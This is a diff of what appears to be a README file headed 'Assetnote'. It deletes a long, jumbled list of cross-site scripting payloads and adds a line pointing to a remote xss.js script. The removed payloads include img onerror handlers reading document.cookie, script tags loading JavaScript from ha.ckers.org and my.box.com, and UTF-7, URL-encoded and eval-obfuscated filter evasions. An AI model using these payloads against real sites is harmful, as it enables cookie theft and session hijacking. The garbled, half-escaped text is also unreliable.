@@ -1,41 +1,4 @@
-<img src=%00 onerror=alert(document.domain)
-<script/src='
-
-<img src=%00 onerror=alert(document.cookie)
-<script/src='
-
-<img src=%00 onerror=confirm(1337)
-<script/src='
-
-“>
-
-‘; alert(2);
-‘)alert(3);//
-
-
-“>
-
-‘; alert(4); ‘)alert(5);//
-
-     
-{font-family:'<iframe/onload=confirm(6)>'
-
-<input/onmouseover="javaSCRIPT:confirm(7)"
-
-
-<img/src=%00 onerror=this.onerror=confirm(8)
-
-<img src=%00 onerror=alert(9)
-<script/src='
-
-http://www.google</a>&lt;script .com&gt;alert(document.location)&lt;/script</p> <p data-sourcepos="67:1-67:85">&lt;a href=[�]&quot;� onmouseover=prompt(1)//&quot;&gt;XYZ&lt;/a</p> <p data-sourcepos="69:1-69:46">&lt;img/src=@ onerror = prompt('11')</p> <p data-sourcepos="71:1-71:47">&lt;style/onload=prompt('XSS')</p> <script ^__^>alert(String.fromCharCode(49))</script ^__^ /***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/ X //style///>SPAN  http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(12) ">' OnMouseOver {Firefox & Opera}
-^__^
-X
-{IE7}  http://ha.ckers.org/scriptlet.html> <IMG SRC=\"javascript:alert('XSS')\" <SCRIPT SRC=//ha.ckers.org/.js> <SCRIPT SRC=http://ha.ckers.org/xss.js?<B> <<SCRIPT>alert(\"XSS\");//<</SCRIPT> <SCRIPT/SRC=\"http://ha.ckers.org/xss.js\
-"> http://ha.ckers.org/xss.js\"></SCRIPT> <IMG SRC=\" javascript:alert('XSS');\"> perl -e 'print \"<SCR\0IPT>alert(\\"XSS\\")</SCR\0IPT>\";' > out perl -e 'print \"<IMG SRC=java\0script:alert(\\"XSS\\")>\";' > out <IMG SRC=\"javascript:alert('XSS');\"> <IMG SRC=\"jav ascript:alert('XSS');\"> <IMG SRC=\"javascript:alert('XSS');\"> <IMG SRC=javascript:alert('XSS')> <IMG SRC=javascript:alert('XSS')> <IMG SRC=javascript:alert('XSS')> <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> <IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"> <IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`> <IMG SRC=javascript:alert("XSS")> <IMG SRC=JaVaScRiPt:alert('XSS')> <IMG SRC=javascript:alert('XSS')> <IMG SRC=\"javascript:alert('XSS');\"> <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> '';!--\"<XSS>=&{()} ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->">'> '';!--"=&{()}      ">  < \";alert('XSS');// ¼script¾alert(¢XSS¢)¼/script¾
-@im\port'\ja\vasc\ript:alert("XSS")';  exp/* a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e); PT SRC="http://ha.ckers.org/xss.js"> TESTHTML5FORMACTION crosssitespt   <img src=" foo=">"> "> foo=">"> ;13 +ADw-script+AD4-alert(document.location)+ADw-/script+AD4- %2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4- +ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi- %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi- %253cscript%253ealert(document.cookie)%253c/script%253e “>alert(document.cookie) “> “>< foo ipt>alert(document.cookie)ipt> %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E ‘; alert(document.cookie); var foo=’ foo\’; alert(document.cookie);//’;   ">
-
-
+Http://ha.ckers.org/xss.js"
 # Assetnote
 
 ![logo](http://i.imgur.com/nY80uWj.png)
